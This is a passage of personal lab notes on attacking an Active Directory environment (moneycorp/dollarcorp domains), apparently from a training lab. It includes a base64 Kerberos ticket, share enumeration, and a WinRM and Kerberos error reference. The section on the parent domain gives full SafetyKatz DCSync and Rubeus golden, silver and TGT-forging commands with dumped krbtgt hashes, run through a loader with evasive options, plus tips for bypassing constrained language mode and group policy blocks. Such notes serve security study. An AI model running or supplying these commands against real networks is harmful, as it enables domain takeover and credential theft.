/ticket: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
```
4. Check the shares
```
net view \\eurocorp-dc.eurocorp.local\ 
```
> Need to try one by one if we can access 
5. Can access the shares
```
dir \\eurocorp-dc.eurocorp.local\sharedwithdcorp\
```

<h1>Error Message Banks</h1>

1. Enter-PSSession
    * Access is denied. For more information, see the about_Remote_Troubleshooting Help topic.
        > Check klist and see if we have the right ticket
    * WinRM cannot complete the operation. Verify that the specified computer name is valid, that the computer is accessible over the network, and that a firewall exception for the WinRM service is enabled and allows access from this computer. By default, the WinRM firewall exception for public profiles limits access to remote computers within the same local subnet.
         > https://stackoverflow.com/questions/39917027/winrm-cannot-complete-the-operation-verify-that-the-specified-computer-name-is
    * Connecting to remote server <FQDN> failed with the following error message : WinRM cannot process the request. The following error with error code 0x80090322 occurred while using Kerberos authentication: An unknown security error occurred. 
        > We have no local admin rights on the target machine 
    * A specified logon session does not exist. it may already have been terminated. 
2. winrs
    * Winrs error:
        `````
        Access is denied.
        `````
        > No ticket at all, no admin rights
    * Winrs error:
        `````
        Winrs error:WinRM cannot process the request. The following error with errorcode 0x80090322 occurred while using Kerberos authentication: An unknown security error occurred.
         Possible causes are:
          -The user name or password specified are invalid.
          -Kerberos is used when no authentication method and no user name are specified.
          -Kerberos accepts domain user names, but not local user names.
          -The Service Principal Name (SPN) for the remote computer name and port does not exist.
          -The client and remote computers are in different domains and there is no trust between the two domains.
         After checking for the above issues, try the following:
          -Check the Event Viewer for events related to authentication.
          -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or use HTTPS transport.
         Note that computers in the TrustedHosts list might not be authenticated.
           -For more information about WinRM configuration, run the following command: winrm help config.
        `````
        > We have no local admin rights on the target machine 
    * Winrs error:
        `````
        WinRM cannot process the request. The following error with errorcode 0x8009030e occurred while using Kerberos authentication: A specified logon session does not exist. It may already have been terminated.
         Possible causes are:
          -The user name or password specified are invalid.
          -Kerberos is used when no authentication method and no user name are specified.
          -Kerberos accepts domain user names, but not local user names.
          -The Service Principal Name (SPN) for the remote computer name and port does not exist.
          -The client and remote computers are in different domains and there is no trust between the two domains.
         After checking for the above issues, try the following:
          -Check the Event Viewer for events related to authentication.
          -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or use HTTPS transport.
         Note that computers in the TrustedHosts list might not be authenticated.
           -For more information about WinRM configuration, run the following command: winrm help config.    
        `````
        > Has the ticket but might have entered the wrong hash/credentials
        > SPN does not serve the service
        > User has no rights to access the computer
        > Logoff and logon
3. Kerberos
    * KRB_AP_ERR_BAD_INTEGRITY
    * KRB_AP_ERR_PREAUTH_FAILED
        > Wrong hash, invalid keys 

4. Invoke-Mimi
    ```
    New-Object : Cannot create type. Only core types are supported in this language mode.
    ```
    ![image](https://hackmd.io/_uploads/rk37YVeiJl.png)
    > No permission to run the script in the directory
    > Solution: For DCORP-ADMINSRV, run in 'Program Files' 

5. Loader
    ```
    This program is blocked by group policy.
    ```
    ![image](https://hackmd.io/_uploads/B18cFExiJl.png)
    > Check Language Mode
    > Solution: Modify script so it loads when run, since cannot do dot sourcing 

6. Set-RemotePSRemoting
    ```
    This error can be ignored: The I/O operation has been aborted because of either a thread exit or an application request.
    ```
    ![image](https://hackmd.io/_uploads/HyDvDVbo1e.png)
    > Can be ignored, means success
    ```
    Get-ChildItem : Access is denied.
    ```
    ![image](https://hackmd.io/_uploads/HyDtP4Zj1l.png)
    > Check if you are at the right computer with the right privilege

7. An attempt on MCORP
    Command:
    ```
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
    ```
    * Given MCORP secrets (MCORP-DC krbtgt hashes)
        ```
        NTLM: a0981492d5dfab1ae0b97b51ea895ddf
        aes256: 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
        aes128: 801bb69b81ef9283f280b97383288442
        md5: c20dc80d51f7abd9
        ```
    * Create a golden ticket for MCORP (using domain SID) 
        ```
        C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /sid:S-1-5-21-335606122-960912869-3279953914 /ldap /user:Administrator /printcmd /domain:moneycorp.local
        ```
        ```
        [*] Attempting to mount: \\mcorp-dc.moneycorp.local\SYSVOL
        [X] Error mounting \\mcorp-dc.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
        [!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
        [*] Attempting to mount: \\dollarcorp.moneycorp.local\SYSVOL
        [X] Error mounting \\dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
        [!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
        [*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
        [X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
        [!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
        [*] Retrieving netbios name information over LDAP from domain controller mcorp-dc.moneycorp.local
        ```
    * Create a golden ticket for MCORP (using parent domain SID) 
        ```
        C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /sid:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /printcmd /domain:moneycorp.local /ptt
        ```
    * Create a silver ticket in hope to winrs to MCORP-DC
        ```
        C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/MONEYCORP.LOCAL /rc4:a0981492d5dfab1ae0b97b51ea895ddf /sid:S-1-5-21-335606122-960912869-3279953914 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap /domain:moneycorp.local
        ```
    * Got error
        ```
        [*] Trying to query LDAP using LDAPS for user information on domain controller mcorp-dc.moneycorp.local
        [X] Error binding to LDAP server: The supplied credential is invalid.
        [!] LDAPS failed, retrying with plaintext LDAP.
        [*] Searching path 'LDAP://mcorp-dc.moneycorp.local/DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
        [X] Error executing the domain searcher: The user name or password is incorrect.

        [X] Error LDAP query failed, unable to create ticket using LDAP.
        ```
    * Inject TGT to current process using MCORP krbtgt
        ```
        C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:Administrator /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt /domain:moneycorp.local
        ```
        ```
        [X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED:

        WinRM cannot process the request. The following error with errorcode 0x80090311 occurred while using Kerberos authentication: We can't sign you in with this credential because your domain isn't available. Make sure your device is connected to your organization's network and try again. If you previously signed in on this device with another credential, you can sign in with that credential
        ```
    > Reason: 
    > * no Domain Controller can actually issue a service ticket outside its own realm
    > * what we need to do is to forge an inter-realm ticket instead, and request a TGS using the inter-realm TGT
    > * we need to use trust key, dcorp\mcorp$ 
    > * we need to specify parent's SID and parent's domain on impersonated user 
    

8. SharpGPOAbuse
Access denied indicates the current process has no necessary tickets or privileges on the GPO
![image](https://hackmd.io/_uploads/ryp5OPCiJe.png)
The GPO already specifies user rights
![image](https://hackmd.io/_uploads/HJEohv0jJg.png)

<h2>Take Note</h2>
    
1. Recommended to use FQDN when using Enter-PSSession 
2. If using NTLM authentication (PTH), set TrustedHosts in Enter-PSSession
3. If winrs does not work, try Enter-PSSession
4. To PSRemote into a machine, u need admin access of that computer 
5. By default winRM uses the machines account as SPN, that is why you can winRM into it
